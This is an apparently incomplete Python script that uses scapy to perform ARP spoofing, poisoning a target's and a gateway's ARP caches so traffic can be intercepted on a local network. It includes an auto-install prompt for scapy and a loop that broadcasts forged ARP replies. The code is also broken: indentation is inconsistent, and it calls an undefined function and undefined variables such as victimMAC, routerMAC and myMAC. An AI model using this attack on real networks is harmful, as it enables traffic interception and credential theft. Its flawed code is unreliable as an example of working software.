#!/usr/bin/env python
#__*__coding:utf:8__*__

RED, GREEN, YELLOW, END = '\033[31m', '\033[32m', '\033[33m', '\033[0m'

import sys
import os

try:
    from scapy.all import *
except ImportError:
    print(RED + '[!] Failed to import scapy' + END)
    try:
        choice = raw_input(YELLOW + '[*] Would you like to install scapy module ? [yY/nN] ' + END)
    except KeyboardInterrupt:
        print(RED + '[!] User keyboard interrupt !' + END)
        raise SystemExit
    if choice.strip().lower()[0] == 'y':
        print(YELLOW + '[*] Trying to install scapy...' + END),
        sys.stdout.flush()
        try:
            import pip
            pip.main(['install', '--upgrade', 'scapy'])
            from scapy.all import *
            print(YELLOW + '[+] Successfully import scapy' + END)
        except Exception:
            print(RED + '[-] Fail to install scapy' + END)
            raise SystemExit
    elif choice.strip().lower()[0] == 'n':
        print(YELLOW + '[*] scapy module will not be installed' + END)
        raise SystemExit
    else:
        print(RED + '[-] Invalid user input !' + END)
        raise SystemExit

def get_mac(target):
	ans, unans = arping(IP)
    for s, r in ans:
    	return r[Ether].src

def Spoof(gateway, target):
    targetMAC = get_mac(target)
    gatewayMAC = MACsnag(gateway)
    send(ARP(op =2, pdst = target, psrc = gateway, hwdst = victimMAC))
    send(ARP(op = 2, pdst = gateway, psrc = target, hwdst = routerMAC))

def arp_spf(target_ip, gateway, interface):
	while True:
		sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=target, hwsrc=myMAC))